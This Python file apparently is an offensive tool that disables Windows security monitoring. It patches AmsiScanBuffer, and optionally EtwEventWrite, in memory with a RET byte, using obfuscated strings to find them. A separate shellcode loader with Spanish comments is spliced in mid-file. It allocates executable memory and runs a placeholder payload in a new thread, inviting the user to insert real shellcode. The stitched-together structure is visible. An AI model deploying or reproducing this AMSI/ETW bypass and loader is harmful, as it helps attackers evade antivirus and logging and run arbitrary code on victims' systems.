import ctypes
import struct
import argparse
import sys
import os

# --- CTYPES SETUP (Windows API Definitions) ---
# Define types used in Windows API functions
LPVOID = ctypes.c_void_p
SIZE_T = ctypes.c_size_t
DWORD = ctypes.c_ulong
BOOL = ctypes.c_bool

# Load necessary DLLs
try:
    kernel32 = ctypes.WinDLL('kernel32.dll')
    ntdll = ctypes.WinDLL('ntdll.dll')

    # Define GetModuleHandleW function signature
    GetModuleHandleW = kernel32.GetModuleHandleW
    GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
    GetModuleHandleW.restype = LPVOID

    # Define GetProcAddress function signature
    GetProcAddress = kernel32.GetProcAddress
    GetProcAddress.argtypes = [LPVOID, ctypes.c_char_p]
    GetProcAddress.restype = LPVOID

    # Define VirtualProtect function signature
    VirtualProtect = kernel32.VirtualProtect
    VirtualProtect.argtypes = [LPVOID, SIZE_T, DWORD, ctypes.POINTER(DWORD)]
    VirtualProtect.restype = BOOL

    # Define RtlMoveMemory (equivalent to memcpy for writing the patch)
    RtlMoveMemory = ntdll.RtlMoveMemory
    RtlMoveMemory.argtypes = [LPVOID, LPVOID, SIZE_T]
    RtlMoveMemory.restype = None

    # Memory Protection constants
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READWRITE = 0x40

except Exception as e:
    print(f"[-] Error loading ctypes or defining functions. Ensure this script runs on Windows. Error: {e}")
    sys.exit(1)

# Verbose print
def verbose(msg, enabled):
    if enabled:
        print(f"[VERBOSE] {msg}")

# Helper to decode unicode byte arrays to strings
def decode_utf16le(byte_list):
    return bytes(byte_list).decode('utf-16le')

# Helper to decode ascii byte arrays to strings
def decode_ascii(byte_list):
    return bytes(byte_list).decode('ascii')

# --- PATCH CONSTANTS ---
# Use 'RET' (0xC3) to bypass AMSI
PATCH_BYTES_AMSI = b"\xC3"  # RET instruction
PATCH_SIZE = len(PATCH_BYTES_AMSI)

# --- MAIN LOGIC ---

def invoke_nullamsi(verbose_flag=False, etw_flag=False):
    print("[*] Starting AMSI patch...")

    # 1. Decoding "obfuscated" strings
    get_proc_bytes = [
        71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0,
        99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0,
        115, 0, 115, 0
    ]
    get_mod_bytes = [
        71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0,
        117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0,
        100, 0, 108, 0, 101, 0
    ]

    get_proc = decode_utf16le(get_proc_bytes)
    get_mod = decode_utf16le(get_mod_bytes)

    verbose(f"Decoded function name (GetProc): {get_proc}", verbose_flag)
    verbose(f"Decoded function name (GetMod): {get_mod}", verbose_flag)

    amsi_dll_bytes = [97, 109, 115, 105, 46, 100, 108, 108]
    amsi_init_bytes = [65, 109, 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101]
    amsi_scanbuffer_bytes = [65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114]  # AmsiScanBuffer

    amsi_dll = decode_ascii(amsi_dll_bytes)
    amsi_init = decode_ascii(amsi_init_bytes)
    amsi_scanbuffer = decode_ascii(amsi_scanbuffer_bytes)

    print(f"[*] Target DLL: {amsi_dll}")
    print(f"[*] Target Function: {amsi_init}")
    print(f"[*] Target Function: {amsi_scanbuffer}")

    # 2. Get function pointers using ctypes
    print("[*] Locating AMSI module and function address...")

    # 2a. Get handle to amsi.dll
    try:
        ctypes.windll.LoadLibrary("amsi.dll")
    except Exception as e:
        print(f"[-] Error loading amsi.dll: {e}")
        print("[-] This may prevent the script from working correctly.")
        # It's not fatal, so we can continue

    amsi_handle = GetModuleHandleW(amsi_dll)
    if amsi_handle:
        verbose(f"amsi.dll handle found at: 0x{amsi_handle:x}", verbose_flag)
    else:
        print("[-] FAILED: Could not get handle to amsi.dll. Is it loaded in the process?")
        return

    # 2b. Get address of AmsiInitialize
    amsi_init_addr = GetProcAddress(amsi_handle, amsi_init.encode('ascii'))
    if amsi_init_addr:
        print(f"[+] SUCCESS: Found {amsi_init} address at: 0x{amsi_init_addr:x}")
    else:
        print(f"[-] FAILED: Could not find address for {amsi_init}.")
        return

    # 2c. Get address of AmsiScanBuffer
    amsi_scanbuffer_addr = GetProcAddress(amsi_handle, amsi_scanbuffer.encode('ascii'))
    if amsi_scanbuffer_addr:
        print(f"[+] SUCCESS: Found {amsi_scanbuffer} address at: 0x{amsi_scanbuffer_addr:x}")
    else:
        print(f"[-] FAILED: Could not find address for {amsi_scanbuffer}.")
        return


    # 3. Patch AmsiScanBuffer
    print(f"[*] Patching {amsi_scanbuffer}...")

    old_protection = DWORD(0)
    
    # Step 3a: Change memory permissions (R-W-X)
    if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection)):
        verbose(f"Memory protection changed successfully to PAGE_EXECUTE_READWRITE at 0x{amsi_scanbuffer_addr:x}", verbose_flag)
        
        # Step 3b: Write the patch bytes
        buffer = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(PATCH_BYTES_AMSI)
        RtlMoveMemory(amsi_scanbuffer_addr, buffer, PATCH_SIZE) 
        
        print(f"[+] Successfully patched {amsi_scanbuffer} at 0x{amsi_scanbuffer_addr:x} with {PATCH_BYTES_AMSI.hex()}")

        # Step 3c: Restore original memory protection
        new_old_protection = DWORD(0)
        if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, old_protection, ctypes.byref(new_old_protection)):
            verbose(f"Memory protection restored to 0x{old_protection.value:x}", verbose_flag)
            print("[+] AMSI patch finished successfully.")
        else:
            print("[-] FAILED: Could not restore memory protection.")
            
    else:
        print("[-] FAILED: Could not change memory protection (VirtualProtect failed).")

    # 4. Optional: Patch ETW
    if etw_flag:
        print("\n[*] ETW patching requested...")
        
        # ETW Target: The function commonly targeted is EtwEventWrite from ntdll.dll
        etw_target = b'EtwEventWrite'
        
        etw_addr = GetProcAddress(ntdll._handle, etw_target)
        
        if etw_addr:
            print(f"[+] SUCCESS: Found {etw_target.decode()} address at: 0x{etw_addr:x}")
            
            old_protection_etw = DWORD(0)

            if VirtualProtect(etw_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection_etw)):
                verbose(f"Memory protection changed successfully to PAGE_EXECUTE_READWRITE at 0x{etw_addr:x}", verbose_flag)

                buffer_etw = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(b"\xC3") # RET
                RtlMoveMemory(etw_addr, buffer_etw, PATCH_SIZE)

                print(f"[+] Successfully patched {etw_target.decode()} at 0x{etw_addr:x} with C3 (RET)")

                 # Restore original memory protection
                new_old_protection_etw = DWORD(0)
                if VirtualProtect(etw_addr, PATCH_SIZE, old_protection_etw, ctypes.byref(new_old_protection_etw)):
                    verbose(f"Memory protection restored to 0x{old_protection_etw.value:x}", verbose_flag)
                    print("[+] ETW patch finished successfully.")
                else:
                    print("[-] FAILED: Could not restore memory protection for ETW.")
            else:
                 print("[-] FAILED: Could not change memory protection (VirtualProtect failed) for ETW.")

        else:
            print(f"[-] FAILED: Could not find address for {etw_target.decode()}.")

import ctypes
import sys

# 1. Shellcode de Ejemplo (Placeholder)
# Nota: Este es un shellcode DE EJEMPLO. En un escenario real,
# aquí pondrías tu shellcode real. Este placeholder es solo para
# demostrar la estructura del script.
# *Reemplaza la matriz de bytes con tu shellcode real.*
# (El shellcode real para un MessageBoxA es largo y complejo de generar manualmente)
SHELLCODE = b"\x90\x90\x90\x90" * 20  # NOP Sled simple como placeholder (80 bytes de \x90)

def load_shellcode_windows(shellcode_bytes):
    """
    Asigna memoria, copia el shellcode y lo ejecuta en un nuevo hilo
    utilizando la API de Windows.
    """
    
    if not sys.platform.startswith('win'):
        print("[-] Este script está diseñado para Windows.")
        return

    # Definiciones de constantes de la API de Windows
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    shellcode_len = len(shellcode_bytes)

    # 1. Asignar memoria para el shellcode
    # Utilizamos VirtualAlloc para obtener un bloque de memoria con permisos de ejecución
    kernel32 = ctypes.windll.kernel32
    
    # lpAddress=None, dwSize=shellcode_len, flAllocationType=MEM_COMMIT | MEM_RESERVE, flProtect=PAGE_EXECUTE_READWRITE
    ptr = kernel32.VirtualAlloc(
        None, 
        shellcode_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    )

    if ptr is None or ptr == 0:
        print(f"[-] Error al asignar memoria: {kernel32.GetLastError()}")
        return

    print(f"[+] Memoria asignada en: 0x{ptr:x}")

    # 2. Copiar el shellcode a la memoria asignada
    # Usamos RtlMoveMemory (o memmove) para copiar los bytes del shellcode
    ctypes.memmove(ptr, shellcode_bytes, shellcode_len)
    
    # 3. Ejecutar el shellcode
    # Creamos un hilo para ejecutar el shellcode.
    # lpThreadAttributes=None, dwStackSize=0, lpStartAddress=ptr, lpParameter=None
    h_thread = kernel32.CreateThread(
        None, 
        0, 
        ptr, 
        None, 
        0, 
        None
    )

    if h_thread is None or h_thread == 0:
        print(f"[-] Error al crear el hilo: {kernel32.GetLastError()}")
        print("[!] Nota: La asignación de memoria persiste.")
        # Opcional: Liberar la memoria con VirtualFree
        # kernel32.VirtualFree(ptr, 0, 0x8000) # MEM_RELEASE
        return

    print(f"[+] Shellcode ejecutándose en el hilo: {h_thread}")

    # Esperar a que el hilo termine (importante si el shellcode hace algo visible)
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF) # 0xFFFFFFFF = INFINITE

    print("[+] Ejecución del shellcode finalizada.")
    


# Entry point
if __name__ == "__main__":
    if os.name != 'nt':
        print("[-] This script must be run on a Windows operating system.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="AMSI/ETW Patching Tool")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-e", "--etw", action="store_true", help="Attempt ETW patching")

    args = parser.parse_args()

    invoke_nullamsi(verbose_flag=args.verbose, etw_flag=args.etw)

    if SHELLCODE == b"\x90\x90\x90\x90" * 20:
        load_shellcode_windows(SHELLCODE)
